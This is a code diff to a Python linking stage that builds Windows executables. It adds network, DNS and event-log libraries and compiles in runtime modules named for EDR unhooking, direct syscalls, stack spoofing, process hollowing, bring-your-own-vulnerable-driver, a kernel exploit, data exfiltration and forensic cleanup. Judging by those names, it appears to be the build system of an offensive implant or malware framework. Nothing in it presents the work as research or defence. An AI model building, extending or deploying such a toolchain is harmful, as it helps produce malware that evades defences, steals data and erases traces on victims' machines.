@@ -42,16 +42,17 @@ class LinkStage(Stage):
 
             # Find lld-link binary
             lld_link = self._find_lld_link()
+            win_libs = ["/defaultlib:ntdll", "/defaultlib:winhttp", "/defaultlib:dnsapi", "/defaultlib:wevtapi"]
             if lld_link:
                 link_cmd = [
                     str(lld_link), f"/out:{output}", "/subsystem:console", "/entry:main", str(obj_path)
-                ] + runtime_objs
+                ] + runtime_objs + win_libs
                 run_cmd(link_cmd, "Linking Windows PE executable (lld-link)")
             else:
                 # Fallback to clang cross-linker
                 link_cmd = [
                     str(tc.clang()), "--target=x86_64-pc-windows-gnu", str(obj_path)
-                ] + runtime_objs + ["-o", str(output)]
+                ] + runtime_objs + ["-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi", "-o", str(output)]
                 run_cmd(link_cmd, "Linking Windows PE executable (clang)")
         else:
             # Linux target
@@ -96,10 +97,17 @@ class LinkStage(Stage):
         windows_sources = []
         if target_os == "windows":
             windows_sources = [
-                runtime_dir / "win_wrapper.c",
-                runtime_dir / "evasion" / "unhook.c",
-                runtime_dir / "evasion" / "syscalls.c",
-                runtime_dir / "execution" / "hollow.c",
+                runtime_dir / "util"         / "mem.c",
+                runtime_dir / "evasion"      / "unhook.c",
+                runtime_dir / "evasion"      / "syscalls.c",
+                runtime_dir / "evasion"      / "stack_spoof.c",
+                runtime_dir / "execution"    / "hollow.c",
+                runtime_dir / "execution"    / "byovd.c",
+                runtime_dir / "execution"    / "inmem.c",
+                runtime_dir / "execution"    / "driver_interact.c",
+                runtime_dir / "exploitation" / "kernel_exploit.c",
+                runtime_dir / "exfil"        / "exfil.c",
+                runtime_dir / "cleanup"      / "forensics.c",
             ]
 
         all_sources = [s for s in portable_sources + windows_sources if s.exists()]
